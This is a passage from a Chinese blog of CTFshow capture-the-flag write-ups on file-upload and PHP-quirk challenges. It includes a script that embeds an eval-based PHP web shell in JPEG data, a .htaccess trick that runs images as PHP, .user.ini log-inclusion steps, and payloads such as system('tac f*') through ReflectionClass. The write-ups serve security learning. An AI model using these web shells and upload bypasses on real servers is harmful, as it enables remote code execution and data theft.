launch:</span></span><br><span class="line"><span class="comment">jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">See also:</span></span><br><span class="line"><span class="comment">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=eval(\$_POST[7]);?&gt;&quot;</span>; <span class="comment">//注意$转义</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">    <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">    <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">        <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">        <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">        <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">            <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">            <span class="variable">$outStreamTmp</span> =</span><br><span class="line">                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) .</span><br><span class="line">                <span class="variable">$miniPayload</span> .</span><br><span class="line">                <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) .</span><br><span class="line">                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">            <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                <span class="variable">$outStream</span> =</span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) .</span><br><span class="line">                    <span class="variable">$miniPayload</span> .</span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                        <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                        <span class="number">0</span>,</span><br><span class="line">                        <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) .</span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">    <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">            <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">            <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意使用之前要导入php的gd库<br>然后注入即可，但是这里我的库没导入明白。所以尝试一下对比渲染前后两个文件。发现内容有部分不会改变，可以在不变处注入木马。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688892427399-bbc837a0-d38d-4ca2-beea-d9b59d3feb7b.png" alt="image.png"><br>试了一下 似乎不太行。<br>太重量级了 ，一直提示下不下来gd扩展。<br>气麻了。不做了。</p><h1 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h1><p>检测是否为zip，穿一个zip然后直接在bp里面抓包即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688899018551-9b58895b-38e1-4f92-831e-1d312225a70d.png" alt="image.png"></p><h1 id="web167"><a href="#web167" class="headerlink" title="web167"></a>web167</h1><h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p>使用<code>.htaccess</code>的一个要求就是使用apache<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688899252427-86a535b8-9d71-4995-9c36-56b8e1ecd69e.png" alt="image.png"><br>htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。<br>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg   <span class="comment">//将.png后缀的文件解析 成php</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688899639889-8d65e30b-7273-496a-82fd-4e5af74b68a3.png" alt="image.png"><br>再传一个jpg为后缀的一句话木马。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688899700671-4d857077-8ad6-4548-bc54-25ea14f1c8c6.png" alt="image.png"></p><h1 id="web168"><a href="#web168" class="headerlink" title="web168"></a>web168</h1><h3 id="基础免杀"><a href="#基础免杀" class="headerlink" title="基础免杀"></a>基础免杀</h3><p>过滤了关键字eval system<br>就简单用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`tac ../f*`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688900322936-79959956-1bac-4480-9a63-9177fc0a01a7.png" alt="image.png"><br>上传之后访问即可。但是注意，点击下载之后跳转链接是错误的。正确的连接<code>/upload/jichumiansha.php</code><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688900506632-4a8dd9e3-991c-4233-af39-1da09d8574f0.png" alt="image.png"></p><h1 id="web169"><a href="#web169" class="headerlink" title="web169"></a>web169</h1><h3 id="日志包含-1"><a href="#日志包含-1" class="headerlink" title="日志包含"></a>日志包含</h3><p>还是之前的.user.ini。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688900849727-63a7d2c3-edd5-40e0-a16d-129958b252d1.png" alt="20210423141358274.png"><br>contenttype要修改成如图的样式。<br>然后再传一个php文件。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688901084652-94e75a15-5c22-4c8a-bafa-86907f8ffa0d.png" alt="image.png"><br>注意图中UA，文件名，文件种类。<br>然后就是访问1.php了。<br><code>upload/1.php?2=tac ../f*</code></p><h1 id="web170"><a href="#web170" class="headerlink" title="web170"></a>web170</h1><h3 id="user-ini-GIF89A文件头"><a href="#user-ini-GIF89A文件头" class="headerlink" title=".user.ini GIF89A文件头"></a>.user.ini GIF89A文件头</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688901395850-cfc84364-443e-406e-bd88-c2c5572653f1.png" alt="image.png"><br>加个文件头即可。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web106-web131php特性篇（二）</title>
      <link href="/2023/07/09/web106-web131php%E7%89%B9%E6%80%A7%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2023/07/09/web106-web131php%E7%89%B9%E6%80%A7%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">  <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>) &amp;&amp; <span class="variable">$v1</span>!=<span class="variable">$v2</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数组和转为0e都行，这里图省事使用了数组绕过。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684334208070-bcca58a3-83a4-4cb2-a742-02362c1d614a.png" alt="image.png"></p><h1 id="web107-parse-str"><a href="#web107-parse-str" class="headerlink" title="web107 parse_str"></a>web107 parse_str</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">  <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">  <span class="title function_ invoke__">parse_str</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="title function_ invoke__">md5</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>parse_str</code>函数会存储值作为变量<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684334510177-e84f6494-6118-48b2-8afe-2446165f306e.png" alt="image.png"><br>因此题目的意思是将v1中flag值与v3中的MD5值相同，那么：<br>GET：<code>?v3=hello</code><br>POST：<code>v1=flag=5d41402abc4b2a76b9719d911017c592</code></p><h1 id="web108-ereg-null绕过和intval"><a href="#web108-ereg-null绕过和intval" class="headerlink" title="web108 ereg null绕过和intval"></a>web108 ereg null绕过和intval</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ereg</code>匹配函数，题目意思为c中只能出现字符，函数在NULL截断漏洞，%00截断绕过<br><code>strrev</code>反转字符串<br>0x36d对应的数值为877，需要反转一次变为778。<br>组合起来payload：<code>a%00778</code></p><h1 id="web109-异常处理类命令执行"><a href="#web109-异常处理类命令执行" class="headerlink" title="web109 异常处理类命令执行"></a>web109 异常处理类命令执行</h1><blockquote><p>异常处理类：<a href="http://c.biancheng.net/view/6253.html">h<del>ttp://c.biancheng.net/view/6253.html</del></a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接构造反射类（并没有想到，反射类还是没有太弄懂）<br><code>?v1=ReflectionClass&amp;v2=system(&quot;tac f*&quot;)</code><br>也可以用exception类，详情见题目下方链接。<br>Exception 异常处理类  payload: <code>?v1=Exception&amp;v2=system(&#39;cat fl36dg.txt&#39;)</code><br>同理：<code>?v1=mysqli&amp;v2=system(&#39;tac fl36dg.txt&#39;)</code><br>这些都是因为类的tostring魔术方法导致的执行。<br>也就是初始化一个mysqli类，但是实际上这个类的初始化时候传参不止这一个，所以是初始化失败的，但是由于其内部有魔术方法__toString：<br>如果类定义了toString方法，就能在测试时，echo打印对象体，对象就会自动调用它所属类定义的toString方法，格式化输出这个对象所包含的数据。<br>这时候就可以echo出来了。<br>同样内部类Exception也是可以的，这个类会把传入的参数输出出来，也是由__toString方法。</p><h2 id="备注："><a href="#备注：" class="headerlink" title="备注："></a>备注：</h2><p>反射类详情见web100方法二</p><h1 id="web110-php内置类-利用-FilesystemIterator-获取指定目录下的所有文件"><a href="#web110-php内置类-利用-FilesystemIterator-获取指定目录下的所有文件" class="headerlink" title="web110 php内置类 利用 FilesystemIterator 获取指定目录下的所有文件"></a>web110 php内置类 利用 FilesystemIterator 获取指定目录下的所有文件</h1><blockquote><p><a href="https://www.php.net/manual/zh/class.filesystemiterator.php">https://www.php.net/manual/zh/class.filesystemiterator.php</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span 